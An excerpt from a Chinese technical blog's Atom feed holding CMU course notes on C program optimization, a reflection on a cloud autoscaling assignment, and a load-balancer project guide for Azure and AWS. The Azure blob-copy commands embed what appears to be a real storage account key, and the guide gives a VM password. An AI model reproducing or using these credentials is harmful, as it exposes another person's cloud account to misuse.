</ul>
</li>
</ul>
<p>架构的分析技术也有分类，比如：</p>
<ul>
<li>基于观察和审核</li>
<li>基于模型</li>
<li>基于模拟</li>
</ul>
<p>这部分讲得比较笼统，大家有个感性的认知即可。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这节课我们继续回到课本中，来看看如何对软件架构进行分析，以及一些常见的分析技巧。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="架构" scheme="http://wdxtub.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
      <category term="设计" scheme="http://wdxtub.com/tags/%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[深入理解计算机系统 第 10 课 Program Optimization]]></title>
    <link href="http://wdxtub.com/2016/02/08/csapp-10/"/>
    <id>http://wdxtub.com/2016/02/08/csapp-10/</id>
    <published>2016-02-09T02:24:11.000Z</published>
    <updated>2016-02-09T04:18:22.000Z</updated>
    <content type="html"><![CDATA[<p>这一讲可谓是全书最实用的部分，介绍如何基于代码执行的机制，去优化我们的代码。</p>
<a id="more"></a>
<hr>
<h2 id="u901A_u7528_u4EE3_u7801_u4F18_u5316_u6280_u5DE7"><a href="#u901A_u7528_u4EE3_u7801_u4F18_u5316_u6280_u5DE7" class="headerlink" title="通用代码优化技巧"></a>通用代码优化技巧</h2><p>即使是常数项系数的操作，同样可能影响性能。性能的优化是一个多层级的过程：算法、数据表示、过程和循环，都是需要考虑的层次。于是，这就要求我们需要对系统有一定的了解，例如：</p>
<ul>
<li>程序是如何编译和执行的</li>
<li>现代处理器和内存是如何工作的</li>
<li>如何衡量程序的性能以及找出瓶颈</li>
<li>如何保持代码模块化的前提下，提高程序性能</li>
</ul>
<p>最根源的优化是对编译器的优化，比方说再寄存器分配、代码排序和选择、死代码消除、效率提升等方面，都可以由编译器做一定的辅助工作。</p>
<p>但是因为这毕竟是一个自动的过程，而代码本身可以非常多样，在不能改变程序行为的前提下，很多时候编译器的优化策略是趋于保守的。并且大部分用来优化的信息来自于过程和静态信息，很难充分进行动态优化。</p>
<p>接下来会介绍一些我们自己需要注意的地方，而不是依赖处理器或者编译器来解决</p>
<h3 id="u4EE3_u7801_u79FB_u52A8"><a href="#u4EE3_u7801_u79FB_u52A8" class="headerlink" title="代码移动"></a>代码移动</h3><p>如果一个表达式总是得到同样的结果，最好把它移动到循环外面，这样只需要计算一次。编译器有时候可以自动完成，比如说使用 <code>-O1</code> 优化。一个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_row</span><span class="params">(<span class="keyword">double</span> *a, <span class="keyword">double</span> *b, <span class="keyword">long</span> i, <span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> j;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">        a[n*i + j] = b[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里 <code>n*i</code> 是重复被计算的，可以放到循环外面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> j;</span><br><span class="line"><span class="keyword">int</span> ni = n * i;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">    a[ni + j] = b[j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u51CF_u5C11_u8BA1_u7B97_u5F3A_u5EA6"><a href="#u51CF_u5C11_u8BA1_u7B97_u5F3A_u5EA6" class="headerlink" title="减少计算强度"></a>减少计算强度</h3><p>用更简单的表达式来完成用时较久的操作，例如 <code>16*x</code> 就可以用 <code>x &lt;&lt; 4</code> 代替，一个比较明显的例子是，可以把乘积转化位一系列的加法，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="keyword">int</span> ni = n * i;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        a[ni + j] = b[j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以把 <code>n*i</code> 用加法代替，比如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ni = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        a[ni + j] = b[j];</span><br><span class="line">    ni += n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u516C_u5171_u5B50_u8868_u8FBE_u5F0F"><a href="#u516C_u5171_u5B50_u8868_u8FBE_u5F0F" class="headerlink" title="公共子表达式"></a>公共子表达式</h3><p>可以重用部分表达式的计算结果，例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Sum neighbors of i, j */</span></span><br><span class="line">up =    val[(i-<span class="number">1</span>)*n + j  ];</span><br><span class="line">down =  val[(i+<span class="number">1</span>)*n + j  ];</span><br><span class="line">left =  val[i*n     + j-<span class="number">1</span>];</span><br><span class="line">right = val[i*n     + j+<span class="number">1</span>];</span><br><span class="line">sum = up + down + left + right;</span><br></pre></td></tr></table></figure>
<p>可以优化为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> inj = i*n + j;</span><br><span class="line">up =    val[inj - n];</span><br><span class="line">down =  val[inj + n];</span><br><span class="line">left =  val[inj - <span class="number">1</span>];</span><br><span class="line">right = val[inj + <span class="number">1</span>];</span><br><span class="line">sum = up + down + left + right;</span><br></pre></td></tr></table></figure>
<p>虽然说，现代处理器对乘法也有很好的优化，但是从 3 次乘法优化到 1 次，总是不错的主意</p>
<h2 id="u963B_u788D_u4EE3_u7801_u4F18_u5316_u7684_u56E0_u7D20"><a href="#u963B_u788D_u4EE3_u7801_u4F18_u5316_u7684_u56E0_u7D20" class="headerlink" title="阻碍代码优化的因素"></a>阻碍代码优化的因素</h2><h3 id="u8FC7_u7A0B_u8C03_u7528"><a href="#u8FC7_u7A0B_u8C03_u7528" class="headerlink" title="过程调用"></a>过程调用</h3><p>我们先来看一段代码，找找有什么问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lower1</span><span class="params">(<span class="keyword">char</span> *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">        <span class="keyword">if</span> (s[i] &gt;= <span class="string">'A'</span> &amp;&amp; s[i] &lt;= <span class="string">'Z'</span>)</span><br><span class="line">            s[i] -= (<span class="string">'A'</span> - <span class="string">'a'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题在于，在字符串长度增加的时候，时间复杂度是二次方的！</p>
<p><img src="/images/14549871142268.jpg" alt=""></p>
<p>问题就在于，每次循环中都会调用一次 <code>strlen(s)</code>，而这个函数本身需要通过遍历字符串来取得长度，因此时间复杂度就成了二次方。</p>
<p>可以怎么优化呢？简单，那么只计算一次就好了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lower2</span><span class="params">(<span class="keyword">char</span> *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    <span class="keyword">size_t</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="keyword">if</span> (s[i] &gt;= <span class="string">'A'</span> &amp;&amp; s[i] &lt;= <span class="string">'Z'</span>)</span><br><span class="line">            s[i] -= (<span class="string">'A'</span> - <span class="string">'a'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>于是曲线图就成了这样，变成线性时间：</p>
<p><img src="/images/14549872807057.jpg" alt=""></p>
<p>有的同学可能就问了，为什么编译器不能自动把这个过程调用给移到外面去呢？</p>
<p>前面说过，编译器的策略必须是保守的，因为过程调用之后所发生的事情是不可控的，所以不能直接改变代码逻辑，比方说，假如 <code>strlen</code> 这个函数改变了字符串 <code>s</code> 的长度，那么每次都需要重新计算。如果移出去的话，就会导致问题。</p>
<p>所以很多时候只能靠程序员自己进行代码优化。</p>
<h3 id="u5185_u5B58_u95EE_u9898"><a href="#u5185_u5B58_u95EE_u9898" class="headerlink" title="内存问题"></a>内存问题</h3><p>接下来我们看另一段代码和由编译器生成的对应汇编：</p>
<p><img src="/images/14549903615932.jpg" alt=""></p>
<p>可以看到在汇编中，每次都会把 <code>b[i]</code> 存进去再读出来，为什么编译器会有这么奇怪的做法呢？</p>
<p>因为有可能这里的 <code>a</code> 和 <code>b</code> 指向的是同一块内存地址，那么每次更新，都会使得值发生变化：</p>
<p><img src="/images/14549904790912.jpg" alt=""></p>
<p>但是中间过程是什么，实际上是没有必要存储起来的，所以我们引入一个临时变量，这样就可以消除 Memory Aliasing 的问题</p>
<p><img src="/images/14549905195484.jpg" alt=""></p>
<h2 id="u5904_u7406_u6761_u4EF6_u5206_u652F"><a href="#u5904_u7406_u6761_u4EF6_u5206_u652F" class="headerlink" title="处理条件分支"></a>处理条件分支</h2><p>这个问题，如果不是对处理器执行指令的机制有一定了解的话，可能会难以理解。</p>
<p><img src="/images/14549908658078.jpg" alt=""></p>
<p>现代处理器普遍采用超标量设计，也就是基于流水线来进行指令的处理，也就是说，当执行当前指令时，接下来要执行的几条指令已经进入流水线的处理流程了。</p>
<p>这个很重要，对于顺序执行来说，不会有任何问题，但是对于条件分支来说，在跳转指令时可能会改变程序的走向，也就是说，之前载入的指令可能是无效的。这个时候就只能清空流水线，然后重新进行载入。处理器内部会采用称为『分支预测』的技术：</p>
<p><img src="/images/14549910810612.jpg" alt=""></p>
<p>比方说在一个循环中，根据预测，可能除了最后一次跳出循环的时候会判断错误之外，其他都是没有问题的。这就可以接受，但是如果处理器不停判断错误的话（比方说代码逻辑写得很奇怪），性能就会得到极大的拖累：</p>
<p><img src="/images/14549912099144.jpg" alt=""></p>
<p>分支问题有些时候会成为最主要的影响性能的因素，但有的时候其实很难避免。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><ul>
<li>用好编译器及其不同的参数设定</li>
<li>不要做蠢事<ul>
<li>注意算法可能隐藏的低效</li>
<li>写堆编译器友好的代码，尤其是过程调用和内存引用</li>
<li>注意内层循环</li>
</ul>
</li>
<li>根据机器来优化代码<ul>
<li>利用指令级并行</li>
<li>避免不可以预测的分支</li>
<li>有效利用缓存 </li>
</ul>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>这一讲可谓是全书最实用的部分，介绍如何基于代码执行的机制，去优化我们的代码。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="程序优化" scheme="http://wdxtub.com/tags/%E7%A8%8B%E5%BA%8F%E4%BC%98%E5%8C%96/"/>
    
      <category term="组成原理" scheme="http://wdxtub.com/tags/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[云计算 反思课 1 试验分析的策略与思考]]></title>
    <link href="http://wdxtub.com/2016/02/08/cc-rethink-1/"/>
    <id>http://wdxtub.com/2016/02/08/cc-rethink-1/</id>
    <published>2016-02-08T13:25:13.000Z</published>
    <updated>2016-02-08T15:49:40.000Z</updated>
    <content type="html"><![CDATA[<p>学习是一个不断改进方法论的过程，从<a href="http://wdxtub.com/2016/02/01/cc-11/">第 11 课</a>中，我学到了一个很重要的东西，就是要对问题本身进行细致分析，并且找到最基本的指标以衡量工作效果。</p>
<a id="more"></a>
<hr>
<p>这节课更多是记录自己思考和反思的过程，以便之后更好地了解问题，解决问题。上次作业的任务大概是这样的：通过模拟一个网站两天的流量，来测试负载均衡器以及自动扩展的功能。也就是说，假设一个网站的访问记录大概是这样的：</p>
<p><img src="/images/14549391991095.jpg" alt=""></p>
<p>我们需要做的是，在高峰期启用更多的机器满足用户需求，在低谷期降低机器数量节约经费，使得总体的性能达到一个令人满意的数值。并且我们可以使用的资源是有限的，如果全程都用多台机器，预算会超出，同样算任务失败。</p>
<p>所以简单来说，这实际上是一个有一个限制条件的优化问题，约束是总的机器时间，目标函数是成功处理的访问请求数量。也就是说，怎么能用最小的成本，获取最大的性能。</p>
<p>机器时间是一个对应的概念，和自然时间不同的是，需要乘以一个性能系数，比方说，我们可以选择『中』或『大』两种不同的机器，同样是开一个小时，『中』的机器时间是 2 小时，『大』的机器时间是 4 小时。</p>
<p>一拿到这个问题，本能的反应就是，可以通过云服务的监控加反馈机制，来对应进行调整，只要策略得当，就可以很好地拟合流量曲线。本着这个思路，就开始各种试验了，但是无论怎么试，都没有办法找到一个很好的解决方案，总是会错过一些流量高峰。模拟实验有时候还会让服务器假装『挂掉』，这样有一段时间就无法处理任何请求，最后的结果一塌糊涂。</p>
<p>现在想想，我犯了两个巨大的错误：</p>
<ol>
<li>我真的细致分析了问题本身吗？或者说，真的考虑到了模拟实验和真实情况的不同吗？</li>
<li>我拿什么来判断多变量的问题的优化呢？数学上可以用梯度下降，针对这个问题，我的梯度下降在哪里呢？</li>
</ol>
<p>先来说第一个问题，我们的模拟实验中，2 分钟相当于现实世界的 1 个小时，这是三十倍的缩放，这一点很重要，也就是说，假设现实的有两个小时的高峰期，那么对应到我们的实验中，就只有 4 分钟。而通过云服务，从申请机器到可以使用，大概有 3-5 分钟的延迟，基本上就意味着，高峰期过了，为了高峰期所申请的机器才可以用，但是已经并没有什么用了。</p>
<p>问题出在哪里，出在云服务申请机器并没有 30 倍的缩放，如果每次申请机器只需要 10 秒，那么还是有机会的。这就说明，因为模拟实验的时间尺度和云服务的时间尺度不一样，灵活策略基本没有意义，还不如直接开够机器，以不变应万变。</p>
<p>如果当初在分析问题的时候意识到这一点，就可以少走很多弯路。</p>
<p>第二个问题，因为每一次成功测试之后课程网站就会给出分数，我就没有想过要如何去有针对性地挑参数（云服务增减机器的策略，虽然通过前面的分析我们已经知道并没有什么用）。</p>
<p>回顾下之前解最优化问题的方式，KKT 条件是要有的，这样就保证了可以通过某种方式找到可能的最优解（哪怕是局部的）。虽然我对具体的参数调整还没有所谓的『直觉』，但是至少应该设定一个基准，比方说先全程拿 4 台『中』机器或者 2 台『大』机器跑一跑，来看看整体的表现。同样因为缺少了这一步，导致最后损失惨重，费用超支要扣分不说，还浪费了很多时间。</p>
<p>接下来无论是生活和学习，都要多去思考场景和问题本身，而不是想当然套用所谓『理所当然』，这就是我学到的一点小小的经验教训。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>学习是一个不断改进方法论的过程，从<a href="http://wdxtub.com/2016/02/01/cc-11/">第 11 课</a>中，我学到了一个很重要的东西，就是要对问题本身进行细致分析，并且找到最基本的指标以衡量工作效果。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="云计算" scheme="http://wdxtub.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
      <category term="思考" scheme="http://wdxtub.com/tags/%E6%80%9D%E8%80%83/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[云计算 第 12 课 深入负载均衡器及其使用策略]]></title>
    <link href="http://wdxtub.com/2016/02/08/cc-12/"/>
    <id>http://wdxtub.com/2016/02/08/cc-12/</id>
    <published>2016-02-08T13:09:38.000Z</published>
    <updated>2016-02-10T19:04:00.000Z</updated>
    <content type="html"><![CDATA[<p>上一讲中我们接触负载均衡器，并且通过一个模拟实验进行了基本的体验，这节课我们通过 Azure 来探索一下负载均衡器的工作原理。</p>
<a id="more"></a>
<hr>
<h2 id="u5B66_u4E60_u76EE_u6807"><a href="#u5B66_u4E60_u76EE_u6807" class="headerlink" title="学习目标"></a>学习目标</h2><ol>
<li>了解负载均衡器内部的基本组件</li>
<li>理解可能影响负载分配策略的各种因素</li>
<li>理解不同的负载分配策略如何影响应用的服务质量(QoS)</li>
<li>使用 Round-Robin 策略来实现一个负载均衡器</li>
<li>学会如何观察和分析实例池中的资源使用情况，并基于这些信息实现一个高效的负载分配策略</li>
<li>在不丢弃请求的前提下，学会如何监控实例的健康状况，并处理实例挂掉的情况</li>
</ol>
<h2 id="u9879_u76EE_u7B80_u4ECB"><a href="#u9879_u76EE_u7B80_u4ECB" class="headerlink" title="项目简介"></a>项目简介</h2><h3 id="u8D1F_u8F7D_u5747_u8861_u5668_u590D_u4E60"><a href="#u8D1F_u8F7D_u5747_u8861_u5668_u590D_u4E60" class="headerlink" title="负载均衡器复习"></a>负载均衡器复习</h3><p>在 web 服务中，负载均衡器是非常重要的，为什么呢？原因有二：</p>
<ol>
<li>提高服务质量(QoS)，包括吞吐量及延迟等等</li>
<li>高可用性(HA)，也就是保证接近 100% 的可用性（用户在不同时间地点都可以访问）</li>
</ol>
<p>前面的项目中，我们使用 Amazon ELB 和 Azure 的 Load Balancer 服务来提高服务质量以及减小花费和处理实例失败。</p>
<p>在 Horizontal Scaling 的时候，负载均衡是由 load generator 完成的。每次添加新机器，load generator 会维护一个列表，并把不同的请求发送给不同的 data center。而在 Auto Scaling 中，我们则是使用 ELB 来完成负载均衡，也就使得我们可以不借助客户端（这里 load generator 可以看作是客户端的集合），就能快速增加机器数量（之前是需要通知客户端来发送给不同的机器d而）。换句话说，我们可以在不更新客户端程序的前提下，根据需求灵活调整机器数量。</p>
<p>除了分配流量，负载均衡器还需要负责处理实例失败。只要 ELB 背后还有一个健康的实例，Load Generator 就会继续发送请求。而 ELB 本身是通过一段时间给实例发消息来检测该实例是否存活的。</p>
<p>看起来很美，对不对，但实际上不同的负载分配策略对性能也会有极大的影响，这个我们后面接着讨论。</p>
<h3 id="u8D1F_u8F7D_u5206_u914D_u7B56_u7565"><a href="#u8D1F_u8F7D_u5206_u914D_u7B56_u7565" class="headerlink" title="负载分配策略"></a>负载分配策略</h3><p>Amazon 的 ELB 使用 Round-Robin 策略来分配负载，并不考虑服务器当前的状况（即使不同的服务器在不同的区域，也不管，反正对于所有机器一视同仁）</p>
<p>上一次我们发送的请求，每一个所需要的服务器资源（CPU，内存，磁盘 IO，网络 IO） 都是类似的，所以我们可以方便地通过增加或减少机器数量来进行调整。</p>
<p>可是实际生活中，不同的请求可能需要的资源差异也很大，如果有些请求需要大量的资源怎么办，这个时候 Round-Robin 策略还是不是高效呢？资源的使用率还会不会平衡呢？这又会如何影响整体的服务质量呢？</p>
<p>这一次我们需要自己实现一个负载均衡的策略，同时还要了解如何监控实例的健康状况，确保只发送请求给健康的实例。</p>
<p>最后需要说明的是，这次的项目主要在 Azure 平台上进行，在 AWS 上重复一次可以得到 10% 的加分，但只能使用 Java</p>
<h3 id="u955C_u50CF_u5217_u8868"><a href="#u955C_u50CF_u5217_u8868" class="headerlink" title="镜像列表"></a>镜像列表</h3><p><strong>Azure</strong></p>
<ul>
<li>Data Center, <code>Standard_A1</code>, <code>https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p22dcv6-osDisk.b0c453f3-f75f-4a2d-bd9c-ae055b830124.vhd</code></li>
<li>Load Generator, <code>Standard_D1</code>, <code>https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p22lgv7-osDisk.c0410b8f-821e-4de3-b725-2a834fd10060.vhd</code></li>
<li>Load Balancer, <code>Standard_D1</code>, <code>https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p22lbv2-osDisk.1cf68388-ac67-4165-bec0-67341257d50a.vhd</code></li>
</ul>
<p><strong>AWS</strong></p>
<ul>
<li>Load Generator, <code>m3.medium</code>, <code>ami-0d4e6067</code></li>
<li>Data Center, <code>m3.medium</code>, <code>ami-6f486605</code></li>
<li>Load Balancer, <code>m3.medium / m3.large</code>, <code>ami-f44c629e</code></li>
<li>标签：<code>Project: 2.2</code></li>
</ul>
<p>因为 Azure 的机制，我们需要把镜像先复制到自己的存储账户中，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># LG</span></span><br><span class="line">azure storage blob copy start https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p22lgv7-osDisk.c0410b8f-<span class="number">821</span>e-<span class="number">4</span>de3-b725-<span class="number">2</span>a834fd10060.vhd --dest-account-name wdxstore --dest-account-key Xc6DDXunKq44PQe3Jhey07fRKeFfPqTm8JBU8CFTPNnj4nCzdgXbWEFvAiM+<span class="number">5</span>F16XBSzwgRyLp0c+os24p4W1w== --dest-container p22</span><br><span class="line"></span><br><span class="line"><span class="comment"># DC</span></span><br><span class="line">azure storage blob copy start https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p22dcv6-osDisk.b0c453f3<span class="operator">-f</span>75f-<span class="number">4</span>a2d-bd9c-ae055b830124.vhd  --dest-account-name wdxstore --dest-account-key Xc6DDXunKq44PQe3Jhey07fRKeFfPqTm8JBU8CFTPNnj4nCzdgXbWEFvAiM+<span class="number">5</span>F16XBSzwgRyLp0c+os24p4W1w== --dest-container p22</span><br><span class="line"></span><br><span class="line"><span class="comment"># LB</span></span><br><span class="line">azure storage blob copy start https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p22lbv2-osDisk.<span class="number">1</span>cf68388-ac67-<span class="number">4165</span>-bec0-<span class="number">67341257</span>d50a.vhd --dest-account-name wdxstore --dest-account-key Xc6DDXunKq44PQe3Jhey07fRKeFfPqTm8JBU8CFTPNnj4nCzdgXbWEFvAiM+<span class="number">5</span>F16XBSzwgRyLp0c+os24p4W1w== --dest-container p22</span><br></pre></td></tr></table></figure>
<h2 id="u8D1F_u8F7D_u5747_u8861_u5668_u7B56_u7565"><a href="#u8D1F_u8F7D_u5747_u8861_u5668_u7B56_u7565" class="headerlink" title="负载均衡器策略"></a>负载均衡器策略</h2><h3 id="u8D1F_u8F7D_u6A21_u5F0F_-__u8D44_u6E90_u7ADE_u4E89"><a href="#u8D1F_u8F7D_u6A21_u5F0F_-__u8D44_u6E90_u7ADE_u4E89" class="headerlink" title="负载模式 - 资源竞争"></a>负载模式 - 资源竞争</h3><p>对于每一台 EC2 实例来说，有如下限制：</p>
<ol>
<li>计算能力 - 每个请求的计算复杂度越高，能够处理的请求总数越低</li>
<li>内存容量 - 每个请求所需要的内存越多，能够处理的请求总数越低</li>
<li>磁盘 IO - 因为每秒中的读写次数是有上限的，每个请求所需要磁盘读写越多，能够处理的请求总数越低</li>
<li>网络 I/O - 带宽是有上限的，传输大的数据包会影响到其他数据的传输速度</li>
</ol>
<p>通常来说，一旦出现资源过载的现象，系统就不得不杀死当前的进程，也就会导致服务质量的下降。那么我们怎么办呢？之前我们的策略是申请更好的实例或者更多的实例，但是随之而来的就是要花更多的钱，即使如此有时候还是不够（有些实例会超载），所以我们需要想办法，让所有的实例一同承受流量冲击</p>
<h3 id="Round_Robin"><a href="#Round_Robin" class="headerlink" title="Round Robin"></a>Round Robin</h3><p>Round Robin 策略很简单，就是轮转着把每个请求分配到不同的实例上去，而不考虑优先级什么的。这个方法的优势在于：超™简单。</p>
<p>这种策略一旦遇到需要特别多资源的请求时，就可能造成某一台实例超载的同时，其他实例都闲着没啥事儿，服务质量降低了不说，钱也没花到刀刃上。</p>
<p>但是当有一个比较大的实例池的时候，所有需要很多资源的请求集中在一个实例上的机会是很小的（但是并不是没有，还是需要具体情况具体分析）</p>
<h3 id="u806A_u660E_u7684_u8D1F_u8F7D_u5206_u914D_u7B56_u7565"><a href="#u806A_u660E_u7684_u8D1F_u8F7D_u5206_u914D_u7B56_u7565" class="headerlink" title="聪明的负载分配策略"></a>聪明的负载分配策略</h3><p>相信聪明的同学已经想到可能的解决办法了，我们只需要找到最合适的实例，把请求对应发过去即可，而不是按顺序一个一个发送。那么问题就来了，怎么找到这个『最合适的』呢？</p>
<ol>
<li>我们需要了解针对一个请求，是要竞争哪一类资源</li>
<li>我们需要知道每个 data center 的工作情况</li>
<li>我们需要根据使用情况来决定下一个请求要发到哪里</li>
</ol>
<p>于是可以继续问自己，针对上述情况，什么策略是最好的，又需要通过什么样的数据结构来存储这些信息呢？</p>
<p>这个方法一定会比 Round-Robin 好吗？不一定，因为判断『最合适』本身，就需要一定资源，带来一定延迟，除非有很大提高，不然功不抵过呀。</p>
<p>下面是两个可能的策略：</p>
<p><strong>基于请求执行时间的策略</strong></p>
<p>这种策略的难点在于，如何预测一个请求需要执行多长时间。</p>
<p><strong>基于资源使用率的策略</strong></p>
<p>平衡所有 data center 的使用率，维护一个有序列表，把请求发给负载最小的实例。</p>
<h2 id="Round_Robin__u5B9E_u6218"><a href="#Round_Robin__u5B9E_u6218" class="headerlink" title="Round Robin 实战"></a>Round Robin 实战</h2><p>我们先来实现一个基于 Round-Robin 的负载均衡器并评估它的效率。这里用两种不同的流量模式来进行测试：</p>
<ol>
<li>周末流量包（测试 Round-Robin 调度）</li>
<li>工作日流量包（测试自定义调度）</li>
</ol>
<h3 id="u4EFB_u52A1_u5217_u8868"><a href="#u4EFB_u52A1_u5217_u8868" class="headerlink" title="任务列表"></a>任务列表</h3><ol>
<li>在 Azure 中启动一台 load balancer 虚拟机</li>
<li>SSH 到 load balancer 上(用户名 <code>ubuntu</code>, 密码 <code>Cloud@123</code>)，需要做的内容在 <code>/home/ubuntu/Project22/</code> 文件夹中</li>
<li>了解给出的框架代码<ul>
<li>可以在 <code>Main.java</code> 找到放置虚拟机 DNS 地址的地方</li>
<li>在 <code>LoadBalancer.java</code> 的 start() 方法中开始写自定义的负载均衡策略</li>
</ul>
</li>
<li>补充完整 <code>LoadBalancer.java</code> 中的 <code>start()</code> 方法，使其可以用 round robin 的方式给已连接的实例分配负载，完成之后使用 <code>javac *.java</code> 来进行编译 </li>
<li>如果你确定自己的代码是对的，那么开启三个 data center 虚拟机，并在 <code>Main.java</code> 中填写的 <code>http://[your DC DNS]</code> 里填好对应的 DNS 地址</li>
<li>使用 <code>./run</code> 来执行你的代码</li>
<li>可以在浏览器中访问 <code>http://[your load balancer DNS]</code> 看到测试 UI</li>
<li>确定 load balancer 的 round robin 没有问题后，开启一个 load generator 虚拟机</li>
<li>提交密码和 andrew id</li>
<li>开始 round robin 测试，目标是达到平均每秒 59 的 RPS</li>
<li>访问 <code>http://[your DC DNS]:8080/info/cpu</code> 来查看 data center 的 CPU 使用率</li>
</ol>
<p>负载是否均衡？在这个测试中，round robin 是一个好的策略吗？</p>
<p>接下来我们就要进入自定义调度算法的测试了。</p>
<h3 id="u5907_u6CE8"><a href="#u5907_u6CE8" class="headerlink" title="备注"></a>备注</h3><ul>
<li>可以在终端使用提供的 Java/Python 代码来开启所有的虚拟机。但是如果一个虚拟机没能通过健康检查，你需要在 load balancer 的代码中完成虚拟机的启动。</li>
<li>注意代码的整洁和模块化。多写点注释，阐述自己的思路</li>
<li>只能修改 <code>LoadBalancer.java</code>, <code>Main.java</code> 和 <code>DataCenterInstance.java</code></li>
<li>不能修改 <code>Request.java</code>, <code>RequestHandler.java</code>, <code>Response.java</code> 和 <code>ResponseBuilder.java</code></li>
</ul>
